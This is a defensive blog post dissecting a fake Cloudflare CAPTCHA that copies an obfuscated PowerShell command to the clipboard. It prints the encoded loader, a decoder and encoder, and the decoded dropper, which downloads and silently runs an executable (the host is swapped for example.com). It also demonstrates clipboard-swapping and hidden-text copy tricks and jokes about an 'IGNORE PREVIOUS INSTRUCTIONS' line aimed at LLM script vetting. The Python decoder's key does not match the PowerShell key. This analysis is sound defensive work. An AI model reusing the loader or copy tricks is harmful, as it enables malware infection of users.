---
title: "Scam Review: Fake Cloudflare CAPTCHA"
date: 2026-05-11
description: A examination and review of a page impersonating a Cloudflare CAPTCHA
extraStyles: css/posts/scam-cf/style.css

status: Draft
---

Scam Review: Fake Cloudflare CAPTCHA
====================================

While perusing the internet, I came across a very familiar looking page.

<figure>
    <picture>
	<img alt="A seemingly normal Cloudflare CAPTCHA" src="/images/posts/scam-cf/captcha.webp" />
    </picture>
    <figcaption>
A seemingly normal Cloudflare CAPTCHA
    </figcaption>
</figure>

I've edited the page in the screenshot to change the domain name as I wouldn't want to direct more people to a malicious page. Throughout this post I will be replacing malicious domain names with [example.com](https://example.com/).

Nothing immediately alerted me that this could potentially be a scam. It's very common (and very annoying) to come across Cloudflare branded pages like this when perusing the internet. This wouldn't last long; upon clicking the verification checkbox I was presented with the following modal:

<figure>
    <picture>
	<img alt="An obviously malicious modal" src="/images/posts/scam-cf/modal.webp" />
    </picture>
    <figcaption>
An obviously malicious modal
    </figcaption>
</figure>

## What's the attack?

In case it needs to be said, please do not copy and paste unknown code into a terminal! As a Linux user, I felt fairly comfortable messing around with their malicious code. Make sure you treat this with care, a feeling of safety can make you an easier target.

The modal instructs the victim to "Paste verification code". This caught my attention as I don't see anything instructing me to copy such a code. The "verification code" was already in my clipboard. This intrigued me, as generally clipboard access in browsers requires some user interaction. Later investigation showed that the payload was copied to the clipboard when I clicked on the checkbox to open the modal.

Let's take our first look at the payload:

```ps1
<# I am not a robot - Cloudflare ID: 5c366723ff3328a3 #>  $k='BpRJlE';$d='56082f0c3f38105b64351629011226036b1e17126d3d2022040f200b153f1b083723243e1301261c186a4835260d30221b123a3e373f06092001296d29353a1d31351f480d0b317e2103201b3739061f131c2a241d052c02112902031e547f041e15725c7e74065b09012c3e5f36221a2d7056032d187f04372b134e6d0b211f301a203d5c2f0c401531060e1e547f171712110f2b341d0b050729353c072e0b6d795b5d0d0b327d3b122603657d3b12260311290203632a2c22170537013729524b130f31385242374e68161d14200b391f07126e20303c1e5d6708781a1d0f2d431531060e634a31705a3d10173624170b6d270a7e22073706186a4821261a17311c022c0303391e030d0f28355a4f6849627e171e2649627949422c05786049002c1c6d741b5b73556139524b2f1a6563524b220021705f082c1a65741d0d784a2c7b594f381a3729092f2d182a3b174b140b27021717360b3624524b161c2c7055412b1a3120015c6c412028130b3302207e11092e4124201b492a0021350a483306356f135b270263241d0d260078344207760b76324757720d77694154735871644a07205a71644757215672364557740827341407730d77364b51715a77604a54210a7736405f745a7d31465e75483622115b20022a2516002f0f3735540b2c0a206d110a2c1b21361e07310b6277524b0c1b31161b0a264e6136524b161d201213152a0d153100152a00226b1b006b3a2023064b130f3138524225473e741d0d7e5f38351e152615162413143743163c1703334e680317052c00212352543e13263106052b15162413143743163c1703334e680317052c00212352543e137e39144e6e002a24524e170b36245f36221a2d7056006a473e350a0f37137e030607311a68000009200b3623524b0507293522073706657414466e392c3e1609343d31291e0363262c3416032d5531220b1d110b283f04036e2731351f466e222c24171422021531060e634a23705f202c1c2635524b061c373f0027201a2c3f1c46100729351c122f17063f1c122a0030350f05221a2638091b78497e030607311a68000009200b3623524b14072b341d11101a3c3c17460b0721341708631e2a2717143006203c1e466e2f3737070b2600311c1b15374e627d3c09131c2a361b0a264969775f312a00213f053537172935554a64262c3416032d4969775f252c0328311c026442613e1e043906276b171e2a1a';$r='';for($p=0;$p -lt $d.Length;$p+=2){$r+=[char](([convert]::ToInt32($d.Substring($p,2),16))-bxor[int][char]$k[$p/2%$k.Length])};&([ScriptBlock]::Create($r))
```

As the modal hints, it's a PowerShell script. The majority of the script is a string which appears to be a hex-encoded payload. Let's take another look with some line breaks


```ps1
<# I am not a robot - Cloudflare ID: 5c366723ff3328a3 #>
$k='BpRJlE';
$d='56082f0c3f38105b64351629011226036b1e17126d3d2022040f200b153f1b083723243e1301261c186a4835260d30221b123a3e373f06092001296d29353a1d31351f480d0b317e2103201b3739061f131c2a241d052c02112902031e547f041e15725c7e74065b09012c3e5f36221a2d7056032d187f04372b134e6d0b211f301a203d5c2f0c401531060e1e547f171712110f2b341d0b050729353c072e0b6d795b5d0d0b327d3b122603657d3b12260311290203632a2c22170537013729524b130f31385242374e68161d14200b391f07126e20303c1e5d6708781a1d0f2d431531060e634a31705a3d10173624170b6d270a7e22073706186a4821261a17311c022c0303391e030d0f28355a4f6849627e171e2649627949422c05786049002c1c6d741b5b73556139524b2f1a6563524b220021705f082c1a65741d0d784a2c7b594f381a3729092f2d182a3b174b140b27021717360b3624524b161c2c7055412b1a3120015c6c412028130b3302207e11092e4124201b492a0021350a483306356f135b270263241d0d260078344207760b76324757720d77694154735871644a07205a71644757215672364557740827341407730d77364b51715a77604a54210a7736405f745a7d31465e75483622115b20022a2516002f0f3735540b2c0a206d110a2c1b21361e07310b6277524b0c1b31161b0a264e6136524b161d201213152a0d153100152a00226b1b006b3a2023064b130f3138524225473e741d0d7e5f38351e152615162413143743163c1703334e680317052c00212352543e13263106052b15162413143743163c1703334e680317052c00212352543e137e39144e6e002a24524e170b36245f36221a2d7056006a473e350a0f37137e030607311a68000009200b3623524b0507293522073706657414466e392c3e1609343d31291e0363262c3416032d5531220b1d110b283f04036e2731351f466e222c24171422021531060e634a23705f202c1c2635524b061c373f0027201a2c3f1c46100729351c122f17063f1c122a0030350f05221a2638091b78497e030607311a68000009200b3623524b14072b341d11101a3c3c17460b0721341708631e2a2717143006203c1e466e2f3737070b2600311c1b15374e627d3c09131c2a361b0a264969775f312a00213f053537172935554a64262c3416032d4969775f252c0328311c026442613e1e043906276b171e2a1a';
$r='';
for ($p=0;$p -lt $d.Length;$p+=2) {
    $r+=[char](([convert]::ToInt32($d.Substring($p,2),16))-bxor[int][char]$k[$p/2%$k.Length])
};
&([ScriptBlock]::Create($r))
```

The script starts with a block comment `<# I am not a robot - Cloudflare ID: 5c366723ff3328a3 #>`. I'm unsure what purpose this comment is meant to serve.

The for loop in the script is decoding the hex-encoded blob `$d` using `$k`, placing it into `$r`.  A `ScriptBlock` then executes `$r`.

We can see the final value of `$r` by removing `&([ScriptBlock]::Create($r))` and adding `echo $r`. If you want to run the above code, make sure to remove `&([ScriptBlock]::Create($r))`!!

Here's a simple python recreation of the above script for non-Windows users (like myself) or sensible Windows users that are trepidatious about running this script:

```py
def decode(k, d):
    # Our accumulator, to be mutated and returned
    r = ''

    # Split `d` into two character pairs
    hex_pairs = [d[i:i+2] for i in range(0, len(d), 2)]

    # Parse the hex digits as base-16 integers
    data = map(lambda h: int(h, 16), hex_pairs)

    for (ix, byte) in enumerate(data):
        # The index of k rotates for each byte
        k_ix = ix % len(k)

        # The character from `k` to be mixed with our current byte
        mix = ord(k[k_ix])

        # Append the character to our accumulator
        r += chr(byte ^ mix)

    return r

# The constants from above
k = 'rfCnEP'
d = '56082f0c3f38105b64351629011226036b1e17126d3d2022040f200b153f1b083723243e1301261c186a4835260d30221b123a3e373f06092001296d29353a1d31351f480d0b317e2103201b3739061f131c2a241d052c02112902031e547f041e15725c7e74065b09012c3e5f36221a2d7056032d187f04372b134e6d0b211f301a203d5c2f0c401531060e1e547f171712110f2b341d0b050729353c072e0b6d795b5d0d0b327d3b122603657d3b12260311290203632a2c22170537013729524b130f31385242374e68161d14200b391f07126e20303c1e5d6708781a1d0f2d431531060e634a31705a3d10173624170b6d270a7e22073706186a4821261a17311c022c0303391e030d0f28355a4f6849627e171e2649627949422c05786049002c1c6d741b5b73556139524b2f1a6563524b220021705f082c1a65741d0d784a2c7b594f381a3729092f2d182a3b174b140b27021717360b3624524b161c2c7055412b1a3120015c6c412028130b3302207e11092e4124201b492a0021350a483306356f135b270263241d0d260078344207760b76324757720d77694154735871644a07205a71644757215672364557740827341407730d77364b51715a77604a54210a7736405f745a7d31465e75483622115b20022a2516002f0f3735540b2c0a206d110a2c1b21361e07310b6277524b0c1b31161b0a264e6136524b161d201213152a0d153100152a00226b1b006b3a2023064b130f3138524225473e741d0d7e5f38351e152615162413143743163c1703334e680317052c00212352543e13263106052b15162413143743163c1703334e680317052c00212352543e137e39144e6e002a24524e170b36245f36221a2d7056006a473e350a0f37137e030607311a68000009200b3623524b0507293522073706657414466e392c3e1609343d31291e0363262c3416032d5531220b1d110b283f04036e2731351f466e222c24171422021531060e634a23705f202c1c2635524b061c373f0027201a2c3f1c46100729351c122f17063f1c122a0030350f05221a2638091b78497e030607311a68000009200b3623524b14072b341d11101a3c3c17460b0721341708631e2a2717143006203c1e466e2f3737070b2600311c1b15374e627d3c09131c2a361b0a264969775f312a00213f053537172935554a64262c3416032d4969775f252c0328311c026442613e1e043906276b171e2a1a'

print(decode(k, d))
```

The result:

```ps1
$nlbzhb='[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;$t=Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName());New-Item -ItemType Directory -Path $t -Force|Out-Null;$f=Join-Path $t ([System.IO.Path]::GetRandomFileName()+''.exe'');$ok=0;for($i=0;$i -lt 3 -and -not $ok;$i++){try{Invoke-WebRequest -Uri ''https://example.com/api/index.php?a=dl&token=d0a5e3b511c293206448ac44451b87f717fbdfa0c2f97242082bd2f29748a486&src=cloudflare&mode=cloudflare'' -OutFile $f -UseBasicParsing;if(Test-Path $f){$ok=1}else{Start-Sleep -Seconds 2}}catch{Start-Sleep -Seconds 2}};if(-not (Test-Path $f)){exit};Start-Process -FilePath $f -WindowStyle Hidden;try{Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue}catch{};';Start-Process -WindowStyle Hidden powershell -ArgumentList '-NoProfile','-WindowStyle','Hidden','-Command',$nlbzhb;exit
```

It looks like we've successfully decoded the payload! Here it is with added whitespace:

```ps1
$nlbzhb='
  [System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;
  $t=Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName());
  New-Item -ItemType Directory -Path $t -Force|Out-Null;
  $f=Join-Path $t ([System.IO.Path]::GetRandomFileName()+''.exe'');
  $ok=0;

  for ($i=0;$i -lt 3 -and -not $ok;$i++) {
    try {
      Invoke-WebRequest -Uri ''https://example.com/api/index.php?a=dl&token=d0a5e3b511c293206448ac44451b87f717fbdfa0c2f97242082bd2f29748a486&src=cloudflare&mode=cloudflare'' -OutFile $f -UseBasicParsing;
      if (Test-Path $f) {
        $ok=1
      } else {
        Start-Sleep -Seconds 2
      }
    } catch {
      Start-Sleep -Seconds 2
    }
  };
  if (-not (Test-Path $f)) {
     exit
  };

  Start-Process -FilePath $f -WindowStyle Hidden;

  try {
    Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
  }catch{};';

Start-Process -WindowStyle Hidden powershell -ArgumentList '-NoProfile','-WindowStyle','Hidden','-Command',$nlbzhb;
exit
```

Notice that the URL in this script is changed from the original. I did this to avoid turning attention to the malicious party and to protect readers who might foolishly execute the above script.

This script feels a bit more interesting to me than the first. The majority of this script is inside a string `$nlbzhb` which is executed via `Start-Process` towards the end of the script.

Looking at the script inside `$nlbzhb`, a random file name inside a tmp directory is loaded into `$f`. The script then makes a few attempts to download a file from a URL (which I've modified to not point to a malicious file). This URL takes `src` and `mode` query parameters, both of which are named cloudflare. This should let the server know to give us a malicious binary that works for (and perhaps is themed like) the fake Cloudflare CAPTCHA that we started with. In theory, the attacker could make multiple different styles of fake CAPTCHA for different providers with little added effort, although I've found no evidence of this actually being done. The script makes a few attempts at downloading the file, giving up if it is unable to do so. If it is successful at downloading the executable, it ends by executing it and attempting to cover its tracks by deleting it.

What does the executable in question actually do? I don't know. I didn't download or inspect the executable. I don't find it necessary to do so here because if the attacker can run arbitrary code the game is lost. At this point the attacker will have near complete control over the victim's system, so I don't consider the details of what they actually choose to do particularly important.

## How should users respond?

Do not execute code that is copied to your clipboard from a random website.

Do not execute code that is copied to your clipboard from a random website.

What if a website is trustworthy?

First, ask yourself if the website is truly trustworthy. Until I clicked the checkbox and saw the modal pop up, I had thought I was using a real Cloudflare page. It is fairly trivial for even an unskilled web developer to make a page that is a convincing visual clone of another.

Next, make sure that the website you are on is using HTTPS rather than insecure HTTP. A page served with insecure HTTP is subject to man-in-the-middle (MITM) attacks. The site may be legitimate, but its contents could be tampered with en route to your web browser. Today, most pages use HTTPS. There is little reason to continue using HTTP, but if a page does use HTTP make sure to interact with a heavy dose of concern. MITM attacks of this variety are vanishingly rare in practice, but be aware that insecure HTTP invites attackers into what should be secure and private communication.

If you're convinced that a website is legitimate and trustworthy things are a bit trickier. Let's take a look at [brew.sh](https://brew.sh/), the homepage of the Homebrew package manager:

<figure>
    <picture>
	<img alt="The homepage of the Homebrew project featuring a button to copy a script" src="/images/posts/scam-cf/brew.webp" />
    </picture>
    <figcaption>
The homepage of the Homebrew project featuring a button to copy a script
    </figcaption>
</figure>

This page is that of a reputable project. It is delivered with HTTPS. There are still steps I would recommend taking before blindly following their instructions.

- Make sure what you think you copied is what you actually copied.
- To the best of your ability, try to understand what the code you copy is doing.

### What did I just copy?

There is absolutely nothing guaranteeing that the text next to a copy button is what that copy button places into your clipboard. Consider the following example:

<div class="copy-button-container">
  <div class="label">My favorite color is green!</div>
  <button id="evil-copy-button">Copy</div>
  <script>
    btn = document.querySelector('#evil-copy-button')
    btn.addEventListener('click', () => {
      const toBeCopied = new ClipboardItem({'text/plain': "I lied! It's purple!"});
      navigator.clipboard.write([toBeCopied]);
    });
  </script>
</div>

From the perspective of a browser, nothing suspicious is taking place here. The clipboard api is being used exactly as designed. Aside from error checking and feedback that the copy succeeded, this is roughly how any use of the clipboard looks.

```html
<div class="copy-button-container">
  <div class="label">My favorite color is green!</div>
  <button id="evil-copy-button">Copy</div>
  <script>
    btn = document.querySelector('#evil-copy-button')
    btn.addEventListener('click', () => {
      const toBeCopied = new ClipboardItem({'text/plain': "I lied! It's purple!"});
      navigator.clipboard.write([toBeCopied]);
    });
  </script>
</div>
```

In this case, the difference between the copied text and the expect text makes the trick obvious. A malicious actor could instead change `https://raw.githubusercontent.com/` to `https://raw.gihtubusercontent.com/`, a small difficult to detect change which entirely changes the meaning of the message. At time of writing, that domain is available for only $12 a year!

Should browsers make some attempt to check if the copied message differs from the text signifying it? This could be a nice feature which might truly save some users from harm. The challenge would be in the execution. A naïve implementation would likely be vulnerable to a number of tricks. There are legitimate reasons for the copied text differing from the text it represents. For instance, GitHub displays the first 7 characters of a commit's SHA hash. The copy button next to it places the full SHA hash into a user's clipboard.

One way to avoid this attack is to manually copy the string rather than depending on a copy button. This is not foolproof either. Consider what happens when trying to copy the sentence below:

<div class="copy-bg-container">
  <div class="label">Secret password<span class="sneak">SNEAK</span> required!</div>
</div>

Very little is needed to trick users into manually copying malicious text in this manner. Here's all that was needed for this attack:

```html
<div class="copy-bg-container">
  <div class="label">Secret password<span class="sneak"> SNEAK</span> required!</div>
</div>

<style>
/* Only relevant styles shown */
.copy-bg-container {
    & .label {
        background: var(--color-green);
    }

    & .sneak {
        color: var(--color-green);
        font-size: 0.01px;
    }
}
</style>
```

In my testing, a font size of `0px` worked just as well as the `0.01px` used above. Even at maximum zoom, however, the sneaky text is not visible.

I don't think it would be unreasonable for browsers to provide some sort of warning if the user attempts to copy very small text or text which matches or nearly matches the color of it's background. Once again, execution would be key. While the attack above is very straightforward, I can think of a number of ways to obfuscate the attack, which I will not describe here.

The attack above becomes very clear once you look at the DOM tree. No longer is the `.sneak` span hidden with a `0.01px` font. It may behoove you to look at the DOM tree first. While this is fairly simple on modern desktop browsers, I wouldn't know how to do this on my iPhone. This is an instance where keeping developer tools away from users makes them less safe.

Regardless, the important point is that the text you copy might not be the text you thought you were copying. If you must execute code you've copied from a website, paste it into a plain-text editor to carefully examine it first.

### What am I running?

Once you've verified that the text you've copied looks good, make sure to do your very best to understand the purpose of that code.

Let's consider the shell script above that the Homebrew project recommends copying and pasting to install Homebrew:

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

What's going on here? `/bin/bash -c "SCRIPT"` will execute the script inside the parenthesis. `curl` can be used to download files from the internet. Here it's being used inside a subshell (`$()`). The result from `curl` replaces the subshell and is executed by `/bin/bash`. Wait a minute... isn't downloading a random file from the internet and executing it what the original exploit in this article was doing? Yes, here Homebrew is doing the same thing. "Don't pipe curl into sh" is basic Unix advice for a reason. In this specific case, I believe Homebrew is being not acting maliciously, but they're normalizing an action most Unix users would consider to be very reckless.

Fortunately, Homebrew are not at all obfuscating what they're doing. We can look at the file they want to download and execute (it's [here](https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)), read through it, and make sure we feel comfortable executing it.

Unfortunately, the file is more than a thousand lines of shell script (a language which has notoriously subtle behavior). Is it reasonable to expect end-users to read, understand, and vet a file of this complexity before they run it? I'm a bit split on this. On one hand, users should be responsible for the code they choose to run on their machines. On the other, it would be a tremendous undertaking for me to read through this entire file and confirm that nothing suspicious is being done. Tools like [ShellCheck](https://www.shellcheck.net/) can be helpful to detect potential issues, but they aren't perfect. Perhaps an LLM could be used to vet the script, but how much can you truly rely on them? If you choose to go down this path, make sure to at least scan the file for comments with `IGNORE PREVIOUS INSTRUCTIONS...` ;)

Ultimately, all computer users regularly execute code they have not properly vetted. Whether that be the javascript on this page or the very operating system your machine depends on (no, you have NOT read every line of the Linux kernel you execute), modern computing is an exercise in risk-mitigation and trust. At the end of the day, I trust the sketchy Homebrew installer piped into `/bin/bash` more than I trust the average package they host. In some ways I consider this to be more of a reason to be upset by their installer. Do not carelessly copy code from the web into your terminal. Do not think "Oh, I just did this to install Homebrew and it worked fine. This is probably OK too." Just because that's how they choose to distribute their installer does not mean it's a reasonable thing to do regularly.

## A bleaker future?

Imagine now that the page we examined earlier was not fraudulent. Imagine that Cloudflare actually said "Here's some arbitrary code. Execute it or you can't visit this page." Cloudflare has become a gatekeeper to a significant portion of the internet. If they did determine that running arbitrary code on client's devices was the only way to ensure traffic legitimacy, hundreds of millions of internet users would have no recourse. In this world, the scam would not look the same. For one, neither iOS nor android devices allow for attacks like this. Windows and macOS as well continue to take steps to prevent execution of unsigned code. In this hypothetical, they would instead link to instructions for installing a Cloudflare app fit for your device. How much of an improvement is this really?

## Scam review

Since this post is titled as a scam review, I figure I might as well review the scam.

Pros:

- The scam is a very convincing replica of Cloudflare's CAPTCHA -- at least at first glance
- Cloudflare is a good target. As I wrote above, Cloudflare has become the gatekeeper of the internet. They have the ability to make internet users writ large do whatever they desire.
- CAPTCHA in general is a good target. The rise of AI systems could convince potential victims that stricter and stricter methods of determining humanity are required.
- The registrar of the page is... Cloudflare. I appreciate this bit of irony.

Cons:

- The scam jumps too quickly to make you copy code into your terminal. While it would be significantly more difficult to implement, it might have been more convincing if the victim was forced into an uncomfortable number of "spot the bridge" games first. I would have liked to see some messaging like "Special verification required" to convey that this is an unusual request
- The payload starts with a block comment stating `<# I am not a robot - Cloudflare ID: 5c366723ff3328a3 #>`. This may be intended to make a user that sees the script think it comes from Cloudflare, but it just confused me.
- While this scam targets non-technically proficient victims, it is asking a lot of them to be able to open PowerShell/ Terminal as an administrator. Special instructions on how to open these applications in more detail may be warranted.
- Encoding the payload as hex digits is quite wasteful.
- The victim will need to accept a ridiculous amount of security pop-ups to allow the malicious code to actually run (if this unsigned code can run at all).
- The scam is Windows specific. When I originally saw the "Powershell/ Terminal" in the instructions, I thought the payload was going to be a PowerShell/ bash polyglot. As a Linux user I felt left out of the fun :/

Final rating: 2/5

★★☆☆☆

## Bonus: There and back again

Earlier, I edited the domain names in the payload such that they no longer linked to malicious websites. Accomplishing this was actually quite straightforward. It is simple enough to write an `encode` function to mirror the `decode` function displayed earlier. Both are presented below to show how similar in form they are:

```py
def decode(k, d):
    # Our accumulator, to be mutated and returned
    r = ''

    # Split `d` into two character pairs
    hex_pairs = [d[i:i+2] for i in range(0, len(d), 2)]

    # Parse the hex digits as base-16 integers
    data = map(lambda h: int(h, 16), hex_pairs)

    for (ix, byte) in enumerate(data):
        # The index of k rotates for each byte
        k_ix = ix % len(k)

        # The character from `k` to be mixed with our current byte
        mix = ord(k[k_ix])

        # Append the character to our accumulator
        r += chr(byte ^ mix)

    return r

def encode(k, d):
    # Our accumulator, to be mutated and returned
    r = ""

    for (ix, ch) in enumerate(d):
        # The index of k rotates for each character
        k_ix = ix % len(k)

        # Our current character mixed with the rotating character from k
        mixed = ord(ch) ^ ord(k[k_ix])

        # The character as two hex digits (0 padded)
        as_hex = f"{mixed:02x}"

        # Append the hex digits to our accumulator
        r += as_hex

    return r
```

Editing the malicious payload to defang it is now as simple as decoding the original payload, making changes as desired, and then re-encoding it. The rotating key `k` makes any changes which change the length of the payload very annoying by hand, as all characters after the length changing operation need to be recalculated.

For extra credit, write a property test to show that `d == decode(k, encode(k, d))` for all strings `d` and non-empty strings `k`. For extra-extra credit, actually prove this with a theorem prover of your choosing ;)


## Closing notes

I reported this page to Cloudflare using their [Abuse form](https://abuse.cloudflare.com/). Within 24 hours they responded and restricted access to the URLs. If you were to visit the page now this is what you would see:

<figure>
    <picture>
	<img alt="A 'Suspected Malware' warning from Cloudflare on the original domain" src="/images/posts/scam-cf/sus.webp" />
    </picture>
    <figcaption>
A "Suspected Malware" warning from Cloudflare on the original domain
    </figcaption>
</figure>

Humorously enough, it now has a legitimate Cloudflare CAPTCHA.

Thanks to my friends Shahan Ankhter and Josh Romer for reading and recommending edits to drafts of this post.